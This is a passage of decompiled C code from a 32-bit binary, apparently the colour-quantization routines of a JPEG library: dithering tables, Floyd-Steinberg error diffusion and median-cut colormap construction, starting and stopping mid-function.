    pcVar3 = *(char **)(*(int *)(param_1 + 0x18) + iVar10 * 4);
    iVar5 = FUN_00426ca4(iVar2,iVar10,0,iVar8 + -1);
    iVar7 = 0;
    pcStack20 = pcVar3;
    do {
      while (iVar5 < iVar7) {
        iVar9 = iVar9 + 1;
        iVar5 = FUN_00426ca4(iVar2,iVar10,iVar9,iVar8 + -1);
      }
      *pcStack20 = (char)iVar9 * (char)iStack32;
      iVar7 = iVar7 + 1;
      pcStack20 = pcStack20 + 1;
    } while (iVar7 < 0x100);
    if (iStack28 != 0) {
      iVar8 = 1;
      pcVar6 = pcVar3 + 0x100;
      do {
        iVar5 = -iVar8;
        iVar8 = iVar8 + 1;
        pcVar3[iVar5] = *pcVar3;
        *pcVar6 = pcVar3[0xff];
        pcVar6 = pcVar6 + 1;
      } while (iVar8 < 0x100);
    }
    local_18 = local_18 + 1;
  }
  return;
}



int * FUN_00426fec(int param_1,int param_2)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  byte *pbVar4;
  int iVar5;
  int *piVar6;
  int iVar7;
  int iStack28;
  int *piStack24;
  byte *pbStack20;
  
  piVar1 = (int *)(***(code ***)(param_1 + 4))(param_1,1,0x400);
  iVar5 = param_2 * 0x200 + -0x200;
  iStack28 = 0;
  pbStack20 = &DAT_00440bdc;
  piStack24 = piVar1;
  do {
    iVar7 = 0;
    pbVar4 = pbStack20;
    piVar6 = piStack24;
    do {
      iVar3 = (uint)*pbVar4 * -2 + 0xff;
      iVar2 = iVar3 * 0xff;
      if (iVar2 < 0) {
        iVar2 = -((iVar3 * -0xff) / iVar5);
      }
      else {
        iVar2 = iVar2 / iVar5;
      }
      *piVar6 = iVar2;
      iVar7 = iVar7 + 1;
      piVar6 = piVar6 + 1;
      pbVar4 = pbVar4 + 1;
    } while (iVar7 < 0x10);
    iStack28 = iStack28 + 1;
    pbStack20 = pbStack20 + 0x10;
    piStack24 = piStack24 + 0x10;
  } while (iStack28 < 0x10);
  return piVar1;
}



void FUN_0042708c(int param_1)

{
  int iVar1;
  int *piVar2;
  int *piVar3;
  int iVar4;
  int iVar5;
  int *piVar6;
  
  iVar1 = *(int *)(param_1 + 0x1cc);
  iVar5 = 0;
  piVar6 = (int *)(iVar1 + 0x20);
  do {
    if (*(int *)(param_1 + 0x78) <= iVar5) {
      return;
    }
    piVar3 = (int *)0x0;
    iVar4 = 0;
    piVar2 = (int *)(iVar1 + 0x20);
    if (0 < iVar5) {
      do {
        if (*piVar6 == *piVar2) {
          piVar3 = (int *)piVar2[5];
          break;
        }
        iVar4 = iVar4 + 1;
        piVar2 = piVar2 + 1;
      } while (iVar4 < iVar5);
    }
    if (piVar3 == (int *)0x0) {
      piVar3 = FUN_00426fec(param_1,*piVar6);
    }
    piVar6[5] = (int)piVar3;
    iVar5 = iVar5 + 1;
    piVar6 = piVar6 + 1;
  } while( true );
}



void FUN_004270f4(int param_1,byte **param_2,char **param_3,int param_4)

{
  byte bVar1;
  int *piVar2;
  int iVar3;
  int iVar4;
  char *pcVar5;
  int iVar6;
  int iVar7;
  int *piVar8;
  byte *pbVar9;
  int iVar10;
  char cVar11;
  char **local_24;
  byte **local_20;
  int local_10;
  
  piVar2 = *(int **)(*(int *)(param_1 + 0x1cc) + 0x18);
  iVar3 = *(int *)(param_1 + 0x70);
  iVar4 = *(int *)(param_1 + 0x78);
  local_10 = 0;
  local_24 = param_3;
  local_20 = param_2;
  if (0 < param_4) {
    do {
      pbVar9 = *local_20;
      pcVar5 = *local_24;
      for (iVar7 = iVar3; iVar7 != 0; iVar7 = iVar7 + -1) {
        cVar11 = '\0';
        iVar10 = 0;
        piVar8 = piVar2;
        if (0 < iVar4) {
          do {
            iVar6 = *piVar8;
            bVar1 = *pbVar9;
            pbVar9 = pbVar9 + 1;
            piVar8 = piVar8 + 1;
            iVar10 = iVar10 + 1;
            cVar11 = cVar11 + *(char *)(iVar6 + (uint)bVar1);
          } while (iVar10 < iVar4);
        }
        *pcVar5 = cVar11;
        pcVar5 = pcVar5 + 1;
      }
      local_10 = local_10 + 1;
      local_24 = local_24 + 1;
      local_20 = local_20 + 1;
    } while (local_10 < param_4);
  }
  return;
}



void FUN_00427194(int param_1,byte **param_2,char **param_3,int param_4)

{
  byte bVar1;
  int *piVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  byte *pbVar7;
  byte *pbVar8;
  byte *pbVar9;
  char *pcVar10;
  int iVar11;
  char **local_20;
  byte **local_1c;
  int local_14;
  
  piVar2 = *(int **)(*(int *)(param_1 + 0x1cc) + 0x18);
  iVar3 = *piVar2;
  iVar4 = piVar2[1];
  iVar5 = piVar2[2];
  iVar6 = *(int *)(param_1 + 0x70);
  local_14 = 0;
  local_20 = param_3;
  local_1c = param_2;
  if (0 < param_4) {
    do {
      pbVar9 = *local_1c;
      pcVar10 = *local_20;
      for (iVar11 = iVar6; iVar11 != 0; iVar11 = iVar11 + -1) {
        bVar1 = *pbVar9;
        pbVar7 = pbVar9 + 1;
        pbVar8 = pbVar9 + 2;
        pbVar9 = pbVar9 + 3;
        *pcVar10 = *(char *)(iVar3 + (uint)bVar1) + *(char *)(iVar4 + (uint)*pbVar7) +
                   *(char *)(iVar5 + (uint)*pbVar8);
        pcVar10 = pcVar10 + 1;
      }
      local_14 = local_14 + 1;
      local_20 = local_20 + 1;
      local_1c = local_1c + 1;
    } while (local_14 < param_4);
  }
  return;
}



void FUN_00427230(int param_1,int *param_2,char **param_3,int param_4)

{
  int iVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  int iVar7;
  uint uVar8;
  char *pcVar9;
  byte *pbVar10;
  int iVar11;
  int *local_38;
  int *local_34;
  char **local_28;
  int local_20;
  int local_1c;
  
  iVar2 = *(int *)(param_1 + 0x1cc);
  iVar3 = *(int *)(param_1 + 0x78);
  iVar4 = *(int *)(param_1 + 0x70);
  local_20 = 0;
  local_38 = param_2;
  local_28 = param_3;
  if (0 < param_4) {
    do {
      FUN_0042dc2c();
      iVar5 = *(int *)(iVar2 + 0x30);
      local_1c = 0;
      local_34 = (int *)(iVar2 + 0x34);
      if (0 < iVar3) {
        do {
          pcVar9 = *local_28;
          pbVar10 = (byte *)(*local_38 + local_1c);
          iVar6 = *(int *)(*(int *)(iVar2 + 0x18) + local_1c * 4);
          iVar7 = *local_34;
          uVar8 = 0;
          for (iVar11 = iVar4; iVar11 != 0; iVar11 = iVar11 + -1) {
            iVar1 = uVar8 * 4;
            uVar8 = uVar8 + 1 & 0xf;
            *pcVar9 = *pcVar9 + *(char *)(iVar6 + (uint)*pbVar10 +
                                         *(int *)(iVar7 + iVar5 * 0x40 + iVar1));
            pcVar9 = pcVar9 + 1;
            pbVar10 = pbVar10 + iVar3;
          }
          local_1c = local_1c + 1;
          local_34 = local_34 + 1;
        } while (local_1c < iVar3);
      }
      *(uint *)(iVar2 + 0x30) = iVar5 + 1U & 0xf;
      local_20 = local_20 + 1;
      local_38 = local_38 + 1;
      local_28 = local_28 + 1;
    } while (local_20 < param_4);
  }
  return;
}



void FUN_0042733c(int param_1,byte **param_2,char **param_3,int param_4)

{
  int iVar1;
  int iVar2;
  int iVar3;
  byte bVar4;
  int iVar5;
  int *piVar6;
  int iVar7;
  int iVar8;
  int iVar9;
  int iVar10;
  int iVar11;
  int iVar12;
  int iVar13;
  int iVar14;
  int iVar15;
  byte *pbVar16;
  byte *pbVar17;
  byte *pbVar18;
  int iVar19;
  uint uVar20;
  char *pcVar21;
  char **local_38;
  byte **local_34;
  int local_28;
  
  iVar5 = *(int *)(param_1 + 0x1cc);
  piVar6 = *(int **)(iVar5 + 0x18);
  iVar7 = *piVar6;
  iVar8 = piVar6[1];
  iVar9 = piVar6[2];
  iVar10 = *(int *)(param_1 + 0x70);
  local_28 = 0;
  local_38 = param_3;
  local_34 = param_2;
  if (0 < param_4) {
    do {
      iVar11 = *(int *)(iVar5 + 0x30);
      pcVar21 = *local_38;
      iVar12 = *(int *)(iVar5 + 0x34);
      iVar19 = iVar11 * 0x40;
      pbVar18 = *local_34;
      iVar13 = *(int *)(iVar5 + 0x38);
      iVar14 = *(int *)(iVar5 + 0x3c);
      uVar20 = 0;
      for (iVar15 = iVar10; iVar15 != 0; iVar15 = iVar15 + -1) {
        bVar4 = *pbVar18;
        pbVar16 = pbVar18 + 1;
        iVar1 = uVar20 * 4;
        pbVar17 = pbVar18 + 2;
        iVar2 = uVar20 * 4;
        pbVar18 = pbVar18 + 3;
        iVar3 = uVar20 * 4;
        uVar20 = uVar20 + 1 & 0xf;
        *pcVar21 = *(char *)(iVar7 + (uint)bVar4 + *(int *)(iVar12 + iVar19 + iVar1)) +
                   *(char *)(iVar8 + (uint)*pbVar16 + *(int *)(iVar13 + iVar19 + iVar2)) +
                   *(char *)(iVar9 + (uint)*pbVar17 + *(int *)(iVar14 + iVar19 + iVar3));
        pcVar21 = pcVar21 + 1;
      }
      *(uint *)(iVar5 + 0x30) = iVar11 + 1U & 0xf;
      local_28 = local_28 + 1;
      local_38 = local_38 + 1;
      local_34 = local_34 + 1;
    } while (local_28 < param_4);
  }
  return;
}



// WARNING: Could not reconcile some variable overlaps

void FUN_00427454(int param_1,int *param_2,char **param_3,int param_4)

{
  byte bVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  int iVar7;
  int iVar8;
  int iVar9;
  uint uVar10;
  int iVar11;
  short *psVar12;
  int iVar13;
  int *local_54;
  short **local_50;
  char **local_44;
  int local_34;
  int local_30;
  int local_2c;
  char *local_1c;
  byte *local_18;
  int local_10;
  int local_c;
  
  iVar2 = *(int *)(param_1 + 0x1cc);
  iVar3 = *(int *)(param_1 + 0x78);
  iVar4 = *(int *)(param_1 + 0x70);
  iVar5 = *(int *)(param_1 + 0x144);
  local_34 = 0;
  local_54 = param_2;
  local_44 = param_3;
  if (0 < param_4) {
    do {
      FUN_0042dc2c();
      local_30 = 0;
      local_50 = (short **)(iVar2 + 0x44);
      if (0 < iVar3) {
        do {
          local_18 = (byte *)(*local_54 + local_30);
          local_1c = *local_44;
          if (*(int *)(iVar2 + 0x54) == 0) {
            iVar13 = 1;
            psVar12 = *local_50;
            local_2c = iVar3;
          }
          else {
            iVar13 = -1;
            local_18 = local_18 + (iVar4 + -1) * iVar3;
            local_1c = local_1c + iVar4 + -1;
            psVar12 = *local_50 + iVar4 + 1;
            local_2c = -iVar3;
          }
          iVar6 = *(int *)(*(int *)(iVar2 + 0x18) + local_30 * 4);
          iVar7 = *(int *)(*(int *)(iVar2 + 0x10) + local_30 * 4);
          iVar9 = 0;
          local_10 = 0;
          local_c = 0;
          for (iVar8 = iVar4; iVar8 != 0; iVar8 = iVar8 + -1) {
            uVar10 = (uint)*(byte *)(iVar5 + (iVar9 + psVar12[iVar13] + 8 >> 4) + (uint)*local_18);
            bVar1 = *(byte *)(iVar6 + uVar10);
            *local_1c = *local_1c + bVar1;
            iVar11 = uVar10 - *(byte *)(iVar7 + (uint)bVar1);
            *psVar12 = (short)local_10 + (short)iVar11 * 3;
            local_10 = local_c + iVar11 * 5;
            iVar9 = iVar11 * 7;
            local_18 = local_18 + local_2c;
            local_1c = local_1c + iVar13;
            psVar12 = psVar12 + iVar13;
            local_c = iVar11;
          }
          *psVar12 = (short)local_10;
          local_30 = local_30 + 1;
          local_50 = local_50 + 1;
        } while (local_30 < iVar3);
      }
      *(uint *)(iVar2 + 0x54) = (uint)(*(int *)(iVar2 + 0x54) == 0);
      local_34 = local_34 + 1;
      local_54 = local_54 + 1;
      local_44 = local_44 + 1;
    } while (local_34 < param_4);
  }
  return;
}



void FUN_00427610(int param_1)

{
  int iVar1;
  undefined4 uVar2;
  undefined4 *puVar3;
  int iVar4;
  
  iVar1 = *(int *)(param_1 + 0x70);
  puVar3 = (undefined4 *)(*(int *)(param_1 + 0x1cc) + 0x44);
  for (iVar4 = 0; iVar4 < *(int *)(param_1 + 0x78); iVar4 = iVar4 + 1) {
    uVar2 = (**(code **)(*(int *)(param_1 + 4) + 4))(param_1,1,iVar1 * 2 + 4);
    *puVar3 = uVar2;
    puVar3 = puVar3 + 1;
  }
  return;
}



void FUN_00427650(int *param_1)

{
  int iVar1;
  int iVar2;
  
  iVar2 = param_1[0x73];
  param_1[0x22] = *(int *)(iVar2 + 0x10);
  param_1[0x21] = *(int *)(iVar2 + 0x14);
  iVar1 = param_1[0x16];
  if (iVar1 == 0) {
    if (param_1[0x1e] == 3) {
      *(code **)(iVar2 + 4) = FUN_00427194;
    }
    else {
      *(code **)(iVar2 + 4) = FUN_004270f4;
    }
  }
  else if (iVar1 == 1) {
    if (param_1[0x1e] == 3) {
      *(code **)(iVar2 + 4) = FUN_0042733c;
    }
    else {
      *(code **)(iVar2 + 4) = FUN_00427230;
    }
    *(undefined4 *)(iVar2 + 0x30) = 0;
    if (*(int *)(iVar2 + 0x1c) == 0) {
      FUN_00426e7c((int)param_1);
    }
    if (*(int *)(iVar2 + 0x34) == 0) {
      FUN_0042708c((int)param_1);
    }
  }
  else if (iVar1 == 2) {
    *(code **)(iVar2 + 4) = FUN_00427454;
    *(undefined4 *)(iVar2 + 0x54) = 0;
    if (*(int *)(iVar2 + 0x44) == 0) {
      FUN_00427610((int)param_1);
    }
    for (iVar2 = 0; iVar2 < param_1[0x1e]; iVar2 = iVar2 + 1) {
      FUN_0042dc2c();
    }
  }
  else {
    *(undefined4 *)(*param_1 + 0x14) = 0x30;
    (**(code **)*param_1)();
  }
  return;
}



void FUN_0042773c(int *param_1)

{
  int iVar1;
  code **ppcVar2;
  
  ppcVar2 = (code **)(**(code **)param_1[1])(param_1,1,0x58);
  param_1[0x73] = (int)ppcVar2;
  *ppcVar2 = FUN_00427650;
  ppcVar2[2] = (code *)&DAT_00427728;
  ppcVar2[3] = (code *)&LAB_0042772c;
  ppcVar2[0x11] = (code *)0x0;
  ppcVar2[0xd] = (code *)0x0;
  if (4 < param_1[0x1e]) {
    iVar1 = *param_1;
    *(undefined4 *)(iVar1 + 0x14) = 0x37;
    *(undefined4 *)(iVar1 + 0x18) = 4;
    (**(code **)*param_1)();
  }
  if (0x100 < param_1[0x18]) {
    iVar1 = *param_1;
    *(undefined4 *)(iVar1 + 0x14) = 0x39;
    *(undefined4 *)(iVar1 + 0x18) = 0x100;
    (**(code **)*param_1)();
  }
  FUN_00426cc8(param_1);
  FUN_00426e7c((int)param_1);
  if (param_1[0x16] == 2) {
    FUN_00427610((int)param_1);
  }
  return;
}



int FUN_00427854(int param_1,int param_2)

{
  int iVar1;
  int iVar2;
  int iVar3;
  
  iVar2 = 0;
  iVar3 = 0;
  iVar1 = 0;
  if (0 < param_2) {
    do {
      if ((iVar2 < *(int *)(param_1 + 0x1c)) && (0 < *(int *)(param_1 + 0x18))) {
        iVar2 = *(int *)(param_1 + 0x1c);
        iVar3 = param_1;
      }
      iVar1 = iVar1 + 1;
      param_1 = param_1 + 0x20;
    } while (iVar1 < param_2);
  }
  return iVar3;
}



int FUN_00427880(int param_1,int param_2)

{
  int iVar1;
  int iVar2;
  int iVar3;
  
  iVar2 = 0;
  iVar3 = 0;
  iVar1 = 0;
  if (0 < param_2) {
    do {
      if (iVar2 < *(int *)(param_1 + 0x18)) {
        iVar2 = *(int *)(param_1 + 0x18);
        iVar3 = param_1;
      }
      iVar1 = iVar1 + 1;
      param_1 = param_1 + 0x20;
    } while (iVar1 < param_2);
  }
  return iVar3;
}



void FUN_004278a8(int param_1,int *param_2)

{
  int *piVar1;
  short sVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  short *psVar6;
  int iVar7;
  int iVar8;
  int local_4c;
  int local_48;
  int local_44;
  int local_40;
  int local_3c;
  int local_38;
  
  iVar3 = *(int *)(*(int *)(param_1 + 0x1cc) + 0x18);
  local_4c = *param_2;
  local_48 = param_2[1];
  local_44 = param_2[2];
  local_40 = param_2[3];
  local_3c = param_2[4];
  iVar8 = param_2[5];
  if (local_4c < local_48) {
    piVar1 = (int *)(iVar3 + local_4c * 4);
    for (iVar5 = local_4c; iVar7 = local_44, iVar5 <= local_48; iVar5 = iVar5 + 1) {
      for (; iVar7 <= local_40; iVar7 = iVar7 + 1) {
        psVar6 = (short *)(*piVar1 + iVar7 * 0x40 + local_3c * 2);
        for (iVar4 = local_3c; iVar4 <= iVar8; iVar4 = iVar4 + 1) {
          sVar2 = *psVar6;
          psVar6 = psVar6 + 1;
          if (sVar2 != 0) {
            *param_2 = iVar5;
            local_4c = iVar5;
            goto LAB_00427973;
          }
        }
      }
      piVar1 = piVar1 + 1;
    }
  }
LAB_00427973:
  if (local_4c < local_48) {
    piVar1 = (int *)(iVar3 + local_48 * 4);
    for (iVar5 = local_48; iVar7 = local_44, local_4c <= iVar5; iVar5 = iVar5 + -1) {
      for (; iVar7 <= local_40; iVar7 = iVar7 + 1) {
        psVar6 = (short *)(*piVar1 + iVar7 * 0x40 + local_3c * 2);
        for (iVar4 = local_3c; iVar4 <= iVar8; iVar4 = iVar4 + 1) {
          sVar2 = *psVar6;
          psVar6 = psVar6 + 1;
          if (sVar2 != 0) {
            param_2[1] = iVar5;
            local_48 = iVar5;
            goto LAB_004279f2;
          }
        }
      }
      piVar1 = piVar1 + -1;
    }
  }
LAB_004279f2:
  iVar5 = local_44;
  if (local_44 < local_40) {
    for (; iVar5 <= local_40; iVar5 = iVar5 + 1) {
      piVar1 = (int *)(iVar3 + local_4c * 4);
      for (iVar7 = local_4c; iVar7 <= local_48; iVar7 = iVar7 + 1) {
        psVar6 = (short *)(*piVar1 + iVar5 * 0x40 + local_3c * 2);
        for (iVar4 = local_3c; iVar4 <= iVar8; iVar4 = iVar4 + 1) {
          sVar2 = *psVar6;
          psVar6 = psVar6 + 1;
          if (sVar2 != 0) {
            param_2[2] = iVar5;
            local_44 = iVar5;
            goto LAB_00427a67;
          }
        }
        piVar1 = piVar1 + 1;
      }
    }
  }
LAB_00427a67:
  iVar5 = local_40;
  if (local_44 < local_40) {
    for (; local_44 <= iVar5; iVar5 = iVar5 + -1) {
      piVar1 = (int *)(iVar3 + local_4c * 4);
      for (iVar7 = local_4c; iVar7 <= local_48; iVar7 = iVar7 + 1) {
        psVar6 = (short *)(*piVar1 + iVar5 * 0x40 + local_3c * 2);
        for (iVar4 = local_3c; iVar4 <= iVar8; iVar4 = iVar4 + 1) {
          sVar2 = *psVar6;
          psVar6 = psVar6 + 1;
          if (sVar2 != 0) {
            param_2[3] = iVar5;
            local_40 = iVar5;
            goto LAB_00427adc;
          }
        }
        piVar1 = piVar1 + 1;
      }
    }
  }
LAB_00427adc:
  iVar5 = local_3c;
  if (local_3c < iVar8) {
    for (; iVar5 <= iVar8; iVar5 = iVar5 + 1) {
      piVar1 = (int *)(iVar3 + local_4c * 4);
      for (iVar7 = local_4c; iVar7 <= local_48; iVar7 = iVar7 + 1) {
        psVar6 = (short *)(*piVar1 + local_44 * 0x40 + iVar5 * 2);
        for (iVar4 = local_44; iVar4 <= local_40; iVar4 = iVar4 + 1) {
          if (*psVar6 != 0) {
            param_2[4] = iVar5;
            local_3c = iVar5;
            goto LAB_00427b4b;
          }
          psVar6 = psVar6 + 0x20;
        }
        piVar1 = piVar1 + 1;
      }
    }
  }
LAB_00427b4b:
  iVar5 = iVar8;
  if (local_3c < iVar8) {
    for (; local_3c <= iVar5; iVar5 = iVar5 + -1) {
      piVar1 = (int *)(iVar3 + local_4c * 4);
      for (iVar7 = local_4c; iVar7 <= local_48; iVar7 = iVar7 + 1) {
        psVar6 = (short *)(*piVar1 + local_44 * 0x40 + iVar5 * 2);
        for (iVar4 = local_44; iVar4 <= local_40; iVar4 = iVar4 + 1) {
          if (*psVar6 != 0) {
            param_2[5] = iVar5;
            iVar8 = iVar5;
            goto LAB_00427bba;
          }
          psVar6 = psVar6 + 0x20;
        }
        piVar1 = piVar1 + 1;
      }
    }
  }
LAB_00427bba:
  iVar4 = (local_48 - local_4c) * 8;
  iVar5 = (iVar8 - local_3c) * 0x10;
  iVar7 = (local_40 - local_44) * 0xc;
  param_2[6] = iVar4 * iVar4 + iVar7 * iVar7 + iVar5 * iVar5;
  local_38 = 0;
  piVar1 = (int *)(iVar3 + local_4c * 4);
  for (; iVar3 = local_44, local_4c <= local_48; local_4c = local_4c + 1) {
    for (; iVar3 <= local_40; iVar3 = iVar3 + 1) {
      psVar6 = (short *)(*piVar1 + iVar3 * 0x40 + local_3c * 2);
      for (iVar5 = local_3c; iVar5 <= iVar8; iVar5 = iVar5 + 1) {
        if (*psVar6 != 0) {
          local_38 = local_38 + 1;
        }
        psVar6 = psVar6 + 1;
      }
    }
    piVar1 = piVar1 + 1;
  }
  param_2[7] = local_38;
  return;
}



int FUN_00427c78(int param_1,int param_2,int param_3,int param_4)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  int *piVar5;
  
  if (param_3 < param_4) {
    do {
      if (param_4 < param_3 * 2) {
        piVar1 = (int *)FUN_00427880(param_2,param_3);
      }
      else {
        piVar1 = (int *)FUN_00427854(param_2,param_3);
      }
      if (piVar1 == (int *)0x0) {
        return param_3;
      }
      piVar5 = (int *)(param_3 * 0x20 + param_2);
      piVar5[1] = piVar1[1];
      piVar5[3] = piVar1[3];
      piVar5[5] = piVar1[5];
      *piVar5 = *piVar1;
      piVar5[2] = piVar1[2];
      piVar5[4] = piVar1[4];
      iVar3 = (piVar1[3] - piVar1[2]) * 0xc;
      iVar4 = (piVar1[5] - piVar1[4]) * 0x10;
      iVar2 = 1;
      if (iVar3 < iVar4) {
        iVar2 = 2;
        iVar3 = iVar4;
      }
      if (iVar3 < (piVar1[1] - *piVar1) * 8) {
        iVar2 = 0;
      }
      if (iVar2 == 0) {
        iVar4 = piVar1[1] + *piVar1 >> 1;
        if (iVar4 < 0) {
          iVar4 = iVar4 + (uint)((piVar1[1] + *piVar1 & 1U) != 0);
        }
        piVar1[1] = iVar4;
        *piVar5 = iVar4 + 1;
      }
      else if (iVar2 == 1) {
        iVar4 = piVar1[3] + piVar1[2] >> 1;
        if (iVar4 < 0) {
          iVar4 = iVar4 + (uint)((piVar1[3] + piVar1[2] & 1U) != 0);
        }
        piVar1[3] = iVar4;
        piVar5[2] = iVar4 + 1;
      }
      else if (iVar2 == 2) {
        iVar4 = piVar1[5] + piVar1[4] >> 1;
        if (iVar4 < 0) {
          iVar4 = iVar4 + (uint)((piVar1[5] + piVar1[4] & 1U) != 0);
        }
        piVar1[5] = iVar4;
        piVar5[4] = iVar4 + 1;
      }
      FUN_004278a8(param_1,piVar1);
      FUN_004278a8(param_1,piVar5);
      param_3 = param_3 + 1;
    } while (param_3 < param_4);
  }
  return param_3;
}



void FUN_00427d94(int param_1,int *param_2,int param_3)

{
  int *piVar1;
  ushort uVar2;
  int iVar3;
  uint uVar4;
  int iVar5;
  int iVar6;
  ushort *puVar7;
  int local_28;
  int local_24;
  int local_20;
  int local_1c;
  
  local_28 = 0;
  local_24 = 0;
  local_20 = 0;
  local_1c = 0;
  iVar5 = *param_2;
  piVar1 = (int *)(*(int *)(*(int *)(param_1 + 0x1cc) + 0x18) + iVar5 * 4);
  for (; iVar3 = param_2[2], iVar5 <= param_2[1]; iVar5 = iVar5 + 1) {
    for (; iVar3 <= param_2[3]; iVar3 = iVar3 + 1) {
      puVar7 = (ushort *)(*piVar1 + iVar3 * 0x40 + param_2[4] * 2);
      for (iVar6 = param_2[4]; iVar6 <= param_2[5]; iVar6 = iVar6 + 1) {
        uVar2 = *puVar7;
        puVar7 = puVar7 + 1;
        uVar4 = (uint)uVar2;
        if (uVar4 != 0) {
          local_28 = local_28 + uVar4;
          local_24 = local_24 + (iVar5 * 8 + 4) * uVar4;
          local_20 = local_20 + (iVar3 * 4 + 2) * uVar4;
          local_1c = local_1c + (iVar6 * 8 + 4) * uVar4;
        }
      }
    }
    piVar1 = piVar1 + 1;
  }
  iVar5 = local_28 >> 1;
  piVar1 = *(int **)(param_1 + 0x88);
  *(char *)(*piVar1 + param_3) = (char)((iVar5 + local_24) / local_28);
  *(char *)(piVar1[1] + param_3) = (char)((iVar5 + local_20) / local_28);
  *(char *)(piVar1[2] + param_3) = (char)((iVar5 + local_1c) / local_28);
  return;
}



void FUN_00427ed8(int *param_1,int param_2)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  
  piVar1 = (int *)(**(code **)param_1[1])(param_1,1,param_2 << 5);
  *piVar1 = 0;
  piVar1[1] = 0x1f;
  piVar1[2] = 0;
  piVar1[3] = 0x3f;
  piVar1[4] = 0;
  piVar1[5] = 0x1f;
  FUN_004278a8((int)param_1,piVar1);
  iVar2 = FUN_00427c78((int)param_1,(int)piVar1,1,param_2);
  iVar3 = 0;
  if (0 < iVar2) {
    do {
      FUN_00427d94((int)param_1,piVar1 + iVar3 * 8,iVar3);
      iVar3 = iVar3 + 1;
    } while (iVar3 < iVar2);
  }
  param_1[0x21] = iVar2;
  iVar3 = *param_1;
  *(undefined4 *)(iVar3 + 0x14) = 0x60;
  *(int *)(iVar3 + 0x18) = iVar2;
  (**(code **)(*param_1 + 4))(param_1,1);
  return;
}



// WARNING: Could not reconcile some variable overlaps

int FUN_00427f70(int param_1,int param_2,int param_3,undefined *param_4,int param_5)

{
  int iVar1;
  int iVar2;
  int *piVar3;
  int iVar4;
  int iVar5;
  uint uVar6;
  int local_440 [256];
  int *local_40;
  byte *local_3c;
  byte *local_38;
  byte *local_34;
  int local_30;
  int local_2c;
  int local_28;
  int local_24;
  int local_20;
  int local_1c;
  int local_18;
  int local_14;
  int local_10;
  int local_c;
  int local_8;
  
  local_c = param_3;
  local_8 = param_2;
  local_10 = *(int *)(param_1 + 0x84);
  local_14 = param_2 + 0x18;
  local_20 = param_2 + param_2 + 0x18 >> 1;
  local_18 = param_3 + 0x1c;
  local_24 = param_3 + param_3 + 0x1c >> 1;
  local_1c = param_5 + 0x18;
  local_28 = param_5 + param_5 + 0x18 >> 1;
  local_30 = 0x7fffffff;
  local_2c = 0;
  local_40 = local_440;
  local_3c = *(byte **)(*(int *)(param_1 + 0x88) + 8);
  local_38 = *(byte **)(*(int *)(param_1 + 0x88) + 4);
  local_34 = **(byte ***)(param_1 + 0x88);
  if (0 < *(int *)(param_1 + 0x84)) {
    do {
      uVar6 = (uint)*local_34;
      if ((int)uVar6 < local_8) {
        iVar5 = (uVar6 - local_8) * (uVar6 - local_8);
        iVar4 = (uVar6 - local_14) * (uVar6 - local_14);
      }
      else if (local_14 < (int)uVar6) {
        iVar5 = (uVar6 - local_14) * (uVar6 - local_14);
        iVar4 = (uVar6 - local_8) * (uVar6 - local_8);
      }
      else {
        iVar5 = 0;
        if (local_20 < (int)uVar6) {
          iVar4 = (uVar6 - local_8) * (uVar6 - local_8);
        }
        else {
          iVar4 = (uVar6 - local_14) * (uVar6 - local_14);
        }
      }
      uVar6 = (uint)*local_38;
      if ((int)uVar6 < local_c) {
        iVar1 = (uVar6 - local_c) * 3;
        iVar2 = (uVar6 - local_18) * 3;
        iVar5 = iVar5 + iVar1 * iVar1;
        iVar4 = iVar4 + iVar2 * iVar2;
      }
      else if (local_18 < (int)uVar6) {
        iVar1 = (uVar6 - local_18) * 3;
        iVar2 = (uVar6 - local_c) * 3;
        iVar5 = iVar5 + iVar1 * iVar1;
        iVar4 = iVar4 + iVar2 * iVar2;
      }
      else if (local_24 < (int)uVar6) {
        iVar1 = (uVar6 - local_c) * 3;
        iVar4 = iVar4 + iVar1 * iVar1;
      }
      else {
        iVar1 = (uVar6 - local_18) * 3;
        iVar4 = iVar4 + iVar1 * iVar1;
      }
      uVar6 = (uint)*local_3c;
      if ((int)uVar6 < param_5) {
        iVar1 = (uVar6 - param_5) * 2;
        iVar5 = iVar5 + iVar1 * iVar1;
        iVar1 = (uVar6 - local_1c) * 2;
        iVar4 = iVar4 + iVar1 * iVar1;
      }
      else if (local_1c < (int)uVar6) {
        iVar1 = (uVar6 - local_1c) * 2;
        iVar5 = iVar5 + iVar1 * iVar1;
        iVar1 = (uVar6 - param_5) * 2;
        iVar4 = iVar4 + iVar1 * iVar1;
      }
      else if (local_28 < (int)uVar6) {
        iVar1 = (uVar6 - param_5) * 2;
        iVar4 = iVar4 + iVar1 * iVar1;
      }
      else {
        iVar1 = (uVar6 - local_1c) * 2;
        iVar4 = iVar4 + iVar1 * iVar1;
      }
      *local_40 = iVar5;
      if (iVar4 < local_30) {
        local_30 = iVar4;
      }
      local_2c = local_2c + 1;
      local_40 = local_40 + 1;
      local_3c = local_3c + 1;
      local_38 = local_38 + 1;
      local_34 = local_34 + 1;
    } while (local_2c < local_10);
  }
  iVar5 = 0;
  local_2c = 0;
  piVar3 = local_440;
  if (0 < local_10) {
    do {
      if (*piVar3 <= local_30) {
        iVar5 = iVar5 + 1;
        *param_4 = (undefined)local_2c;
        param_4 = param_4 + 1;
      }
      local_2c = local_2c + 1;
      piVar3 = piVar3 + 1;
    } while (local_2c < local_10);
  }
  return iVar5;
}



// WARNING: Could not reconcile some variable overlaps

void FUN_004281b0(int param_1,int param_2,int param_3,undefined *param_4,byte *param_5,int param_6,
                 int param_7)

{
  int iVar1;
  int iVar2;
  int *piVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  int local_240 [128];
  byte *local_40;
  int local_3c;
  int local_38;
  int local_34;
  int local_30;
  int local_2c;
  int local_28;
  undefined *local_24;
  uint local_20;
  int local_1c;
  int local_18;
  int local_14;
  int local_10;
  int local_c;
  int local_8;
  
  local_10 = param_3;
  local_c = param_2;
  local_8 = param_1;
  local_1c = 0x7f;
  piVar3 = local_240;
  do {
    *piVar3 = 0x7fffffff;
    piVar3 = piVar3 + 1;
    local_1c = local_1c + -1;
  } while (-1 < local_1c);
  local_1c = 0;
  local_40 = param_5;
  if (0 < param_6) {
    do {
